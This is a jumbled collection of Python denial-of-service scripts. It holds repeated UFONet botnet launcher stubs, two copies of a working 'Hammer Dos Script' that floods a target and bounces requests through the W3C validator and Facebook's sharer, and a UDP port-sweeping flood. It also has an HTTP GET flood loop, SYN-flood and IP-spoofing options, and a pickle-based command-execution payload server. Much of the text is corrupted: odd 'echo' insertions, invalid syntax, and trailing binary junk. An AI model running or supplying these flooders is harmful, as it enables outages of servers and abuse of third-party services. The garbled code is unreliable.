#!/usr/bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()
      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                   


#!usr/bin/python2
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
@@@@@@@@@@@@@@@@@@@@@@@@
#!/usr/bin/env python3
# echo "*echo " coding: utfecho "8 echo "*echo "
new Coding UTFecho "8 How To Services Denial Of Service How To DDoS Attack Starting...!!! By Coder jioxard* Coded jioxard*
Game Cstrike How To Ddosing..!! UTFecho "8 Coding Denial of Services Attack Start. Danger Server Blocker Floods Eweryhere..!!!!!!!!!
Denial Of services.. Attack By Psy SkyNetwork.Net instanceecho "2@ = Botnet Started End Damages Attack Bot All Right Reserved. Flood Enabled Flood;Exploit;Flood;Spam Attack.
SkyNet Flood Ho Denial Of Services BoTNet Spaw Flood BotNet Attack Flood Spaw Services.
""" 
    app = jioxard*()
    options = app.create_options()
    if options:
              app.set_options(options)
           app.run()
          app.land(white)
                 dns__record()
              app.set_licence(options)
        get_random_licence()
               
class jioxard*GeneralExploitATTACK(object):
       def write(self, text)
            pass
       def run(land, text):
            pass
               start = ()
               join=()
def add_useragent():
	uagents = []
	uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
	uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
	uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
	uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
	uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; enecho "US)')
	uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
	uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; enecho "us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
	return uagents

def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utfecho "8')
	return bots

	options = parser.add_argument_group('options','')
	options.add_argument('echo "d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')
	options.add_argument('echo "t',metavar='<float>',default=5.0,help='Set timeout for socket')
	options.add_argument('echo "T',metavar='<int>',default=1000,help='Set threads number for connection (default = 1000)')
	options.add_argument('echo "p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))
	options.add_argument('echo "s',metavar='<int>',default=100,help='Set sleep time for reconnection')
	options.add_argument('echo "i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')
	options.add_argument('echo "Request',action='store_true',help='Enable request target')
	options.add_argument('echo "Synflood',action='store_true',help='Enable synflood attack')
	options.add_argument('echo "Pyslow',action='store_true',help='Enable pyslow attack')
	options.add_argument('echo "echo "fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')
	args = parser.parse_args()
if packet > 1800:
               While True:
            packet = packet +1
        packet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        packet.bind((HOST, PORT))
        packet.listen(1)
        print "*** Ready for connections on %s:%s..." % (HOST, PORT)
        while True:
            conn, addr = s.accept()
            msg = """cos\nsystem\n(S'ls echo "l > proof_of_exploit.txt'\ntR."""
            print "[+] Sending payload to %s!" % addr[0]
            conn.sendall('%8d%s%s' % (len(msg), "0", msg))
            conn.close()
import sys
import json
import time
import string
import signal
import httplib,urlparse
from random import *
from socket import *
from struct import *
from threading import *
from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
from argparse import ArgumentParser,RawTextHelpFormatter
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'Userecho "Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)

if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\031[7m")
	print("\033[94mwaitinq...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()


import syn
import sys
import udp
import flood

alias jioxardLicense
alias jioxardLicense
alias jioxardLicense
alias jioxardLicense
alias jioxardLicense
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

#!//bin/env python 
# echo "*echo " coding: utfecho "8 echo "*echo ""
"""
UFONet echo " DDoS Botnet via Web Abuse echo " 2013/2014/2015/2016 echo " by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110echo "1301  USA
"""
from core.main import UFONet

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2

wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2wait;attack;drop;droped;drop;dropped;wait;dropped;wait;attack;wait;attack;wait;attack2
  ($hrs, $min, $sec) = 
      $timeStr =~ m/([0echo "9]+):([0echo "5][0echo "9]):([0echo "5][0echo "9])/;
  $timeStr =~ 
     s/([0echo "9]+):([0echo "5][0echo "9]):([0echo "5][0echo "9])/\2 min., \3 sec. after \1/;
  $timeStr =~ 
     s/([0echo "9]+):([0echo "5][0echo "9]):([0echo "5][0echo "9])/$2 min., $3 sec. after $1/;
     s/\([0echo "9]+\):\([0echo "5][0echo "9]\):\([0echo "5][0echo "9]\)/\2 min., \3 sec. after \1/;
#!/usr/bin/python3
# echo "*echo " coding: utfecho "8 echo "*echo "

# python 3.3.2+ Hammer Dos Script v.1
# by Can Yalçın
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; enecho "US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; enecho "US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; enecho "US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'Userecho "Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n Userecho "Agent: "+random.choice(uagent)+"\n"+data).encode('utfecho "8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <echo "echo "packet sent! hammeringecho "echo "> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<echo ">down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 hammer.py [echo "s] [echo "p] [echo "t]
	echo "h : help
	echo "s : server ip
	echo "p : port default 80
	echo "t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("echo "q","echo "echo "quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("echo "s","echo "echo "server", dest="host",help="attack to server ip echo "s ip")
	optp.add_option("echo "p","echo "echo "port",type="int",dest="port",help="echo "p 80 default 80")
	optp.add_option("echo "t","echo "echo "turbo",type="int",dest="turbo",help="default 135 echo "t 135")
	optp.add_option("echo "h","echo "echo "help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)echo "8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
#!/usr/bin/python3
# echo "*echo " coding: utfecho "8 echo "*echo "

# python 3.3.2+ Hammer Dos Script v.1
# by  Yiğit Kartal
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; enecho "US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; enecho "US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; enecho "US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'Userecho "Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n Userecho "Agent: "+random.choice(uagent)+"\n"+data).encode('utfecho "8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <echo "echo "packet sent! hammeringecho "echo "> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<echo ">down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 hammer.py [echo "s] [echo "p] [echo "t]
	echo "h : help
	echo "s : server ip
	echo "p : port default 80
	echo "t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("echo "q","echo "echo "quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("echo "s","echo "echo "server", dest="host",help="attack to server ip echo "s ip")
	optp.add_option("echo "p","echo "echo "port",type="int",dest="port",help="echo "p 80 default 80")
	optp.add_option("echo "t","echo "echo "turbo",type="int",dest="turbo",help="default 135 echo "t 135")
	optp.add_option("echo "h","echo "echo "help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)echo "8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
import sys
import os
import time
import soket
import random
#ode Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sok = soket.soket(soket.AF_INET, soket.SOK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("DDoS")
os.system("figlet DDos Attak")
print
print "Author   : HAecho "MRX"
print "You Tube : https://www.youtube.com/c/HAecho "MRX"
print "github   : https://github.com/Ha3MrX"
print "Facebook : https://www.facebook.com/muhamad.jabar222"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
def add_useragent():
	uagents = []
	uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
	uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
	uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
	uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
	uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; enecho "US)')
	uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
	uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; enecho "us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
	return uagents

def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utfecho "8')
	return bots

	options = parser.add_argument_group('options','')
	options.add_argument('echo "d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')
	options.add_argument('echo "t',metavar='<float>',default=5.0,help='Set timeout for socket')
	options.add_argument('echo "T',metavar='<int>',default=1000,help='Set threads number for connection (default = 1000)')
	options.add_argument('echo "p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))
	options.add_argument('echo "s',metavar='<int>',default=100,help='Set sleep time for reconnection')
	options.add_argument('echo "i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')
	options.add_argument('echo "Request',action='store_true',help='Enable request target')
	options.add_argument('echo "Synflood',action='store_true',help='Enable synflood attack')
	options.add_argument('echo "Pyslow',action='store_true',help='Enable pyslow attack')
	options.add_argument('echo "echo "fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')
	args = parser.parse_args()
def threader():
    global threads
    threads=[]
    for i in range(1, int(level)):
        t=threading.Thread(target=attack)
        threads.append(t)
        t.start()
threader()
import socket, sys, os  
"][ Attacking " + sys.argv[1]  + " ... ]["  
"injecting " + sys.argv[2];  
def attack():  
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  
    ">> GET /" + sys.argv[2] + " HTTP/1.1"  
    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close()  
for i in range(1, 1000):  
    attack()  
¯?—sÇ,­ôÇ|[2uŸËRC©é•¿Aş}OZÍr¸Ã6ãÜOõ­MJUrcv‡÷í×ü÷5”Ùl—R¹ÇåşzPu'r9›iœ+m ŒÒ³İÖfu+Î1Ó¿åV¯ÙĞ@nŠ¥(É©r0 ã?Ö‚“¹Fì¬;wÈ0>†²Á[fÕLó[±Vecho "»aƒm$súÔ¼ ªÄá‡PØü1U´’©â0ÈV0d(ÆR6€T}:ÒmE6ÌêÅÊœ’ìo¤áYİ¾¥0b½iÿ¾”dıH5Éx—ágƒüM¶§ ¾‘)ÿ—»Ê/©&?ı™+×5=3´ÚÁ–ı_9 ô9ÿÙ¿ À¼³¼ÓÎå$ùæùı:d{uúõ¯œKZ­ ùeİû—ÿ·£¥ıbÏ"ÅacÌ›kÉßÿ%•ßİ/‘ëI¨İ_'ú>›w'ûR"Åÿ¡J;Z¸`<‹[UÅ$­#~*øõ|­©~ÔŞ9¿E¬º~˜Œ2Z|íü\¶O>‚¸ÍWãWµ«…·ŸÄWo¿ï§h—n9%P~kĞ¥ÂÕäÓªÒùßò<©ñBòô_çcîÍ?û<	µ]z;Ô}äÀ¼¾[ùÖÿÄ‡š#2İx…u	ÉHå’àÁrµñ¢x©yu9ù&O>™<âºÿ xÄŞecho "x§´ğıÍÄyù_É)¯‰ur%[÷p!ô<Ø>»k_ÚKÄZçš,¡°ÒãÏÊÍI üX…?•A¡şÌºî¨VMSP´Ò"'w“ß>ÿtãÆ½3Eı¼%¢Ú‡Ô$¹Ôv|ÌóÌ!AøG·©4ù²<#Ñ:çÿŞwŠÕòÓ^—¯èxŞ§ñÅ:Ú¬ş$»‘K ÑÄâ#Ó·üı(±ø}â=xLĞéS´Ùecho ";ÆÊ˜Îr¸ôï_EXi¾ğã'öF›l%ìecho "L­øº©ıMjGâAî6A¤¶ÁŒÉs2ÆĞ.óùYËˆ¡KİÃPŒ|ßü~bÿWê×÷±x‰KËşç;áİxWáĞÓìŠ[kQ’Òíùc‘‡\îÔWá¿Ù¦ËNÔíPÕ§¼L®©B%Ú9;‰,OãœW³İÏ}¨y¦†İÀ86Ñ|ËŸvÈ?•V·¸ƒBÓõecho "nöyd··Frò«œàtäÃœ ùw˜V êJ•MfõiZÿ©ôoF¢¦ªA{š%½¿«Å‹=Çö…àİJîÅ´{G¥§É*——f>Ï'÷wØ=v é4­;B´“n¤G ã‚ÓÊß$şKÀ¶ÓRë[Ô!Çˆµ§ûMüÀä©şşê.cÒº;«=²a$%à\Ôäã^şgdÔz¡ªàK´@şõ`xËÆRè×Úv‰¦¬Û‚»£H»£‚%ÆéïŒ€s]ºG™KŠzşUâÏÚø­ ¹wkecho "BÓwÙ¯`zgªxe=Ôş†•åÜw3ƒŒfœ¶8¯Î4=Ä×Ò^_Ïë—ÒËÊğai")‘¸ià÷ü«ó“O†Ë©]Íiö§rf³Ô2±3sÀÀúEã¿Ãñ7ÁréŒ2YyØtc™ÚÄô?|›âß€ÚçÃ0ÜBŸÙ£™\IsÕà@uÀ5õ9léÁ¸½$Ï›Åªù–•ag¯xr9EÊ$ Gï@Ù!€ô]ÀğxäUÈ~kÒhÏ«ÛiÒŞiÑã}Í¸Ş«“9ˆª¿„­ï Œ„F³x†Ş—$N ’sÏ\÷¯Nøñc]ğ¬Ş×bDeCºìVÈÆíÀu÷õ×ĞÚîÛ3Î½ôGgûÜı›ÄZı³u’Ú91şëãú×…~Ò)ıñOÅ°çkµóÈ³|ßû5}ğ«A›Cøúº´2O¦kzuÆ€)yC+oÀàğ>ğÆzãšòOÚ]Ñ|ûQßê&ğáñ’Éir‘5É‰ìPÍ´ŞrÊÜÖ¾}7ÁÊÛÇü¿Èô_¿†§wmZ=/öyø;‡şiZİœğAâ«§ûzŞğÁC–Çğ”8#±bzŠú/Ã(‹\ßkvMÔ!v·>ğ÷üÃÃP:Çµ™˜œ¡ÛÃ‹oÍvºüáUŒ@Üj^$¿qüM{gğX…}{sj&·– í˜…7ÇÃ.F2=ÅsŞÓµ/ i6ºk2êğÛ(' åÎÊ:‚}NáŸJWmjÿw;¾o‘åøQàÏÙwÂ^&—Bóì¬à±’úi¯$3;Êªvg§÷@ÀùÄ÷³\¼×3LÏ<²3¼ƒ«19'ó5úMûLøŠecho "à§Ä=Nò3h‘é2DÉ3) ²•å$d™9êE~KØ|[¶š"ŸOA £´¥ìc·^~õèå<¯Ú;j|k~íßCêÙwáN‹ñâzé¾&Œ_ivöS\pì»äùUCcÅºÿúW´|ı|kğ+öˆµÓšK½_áÏšĞJfecho "l~eY#Î‚1œ`æ³¿àÚx‹[ÖüT—	%­¢ÙÛóÎésdvÀ@?ûk\Ê²óA$#«qXãš•fûn<=ISŠQ{œÄO[Ë}½jëos’Z4~X*ñ	`w8ÁÇ<Š¯«Dd»äÜ<ŒöËë¼qq:}´R:«ÜMå"ŸâÄ€ñøV»Løï±zı3ıkÑË/<Îš¾‘‹·•ÿà³ÊÌÔ!—M¥¬š¿š0şÈîûöœcô©VÑ‚@ã½i½¾àrØBzUk›U#;òGjı üß‘Emscáº}^Ô1+ö€TÁĞ“úšÊ‹U¾²¥äÚVÀàÉ…™©^ø`ñĞš¿àk…OŞÄ†‚9:g~è)ÚŠ¬:ÌylŒ?Zùà¨âqU¨Õ]ßŞ}Ÿ×«a°”+RzY&»ÙÀ#û‰â˜D±˜îyU‘Ùa=Æxe>Õq¡êÚı­ı³b:l\¯ÕxÜä`ú)©u).–æ^ÒõFÄkãĞöaìr*kOf¢G­ˆÕêàùcß^Jg×‘êE|æiÃÓŒ\¢¹—–èú¿=¥]¨_–]ÏÑÿÃ3:ËSƒVX¾Ër³Fd ÀğÃÕH<‚=5±q‡×xÀE „mÏõ5¤|1¦j7#Q‰bKÖL¨‡ßcv 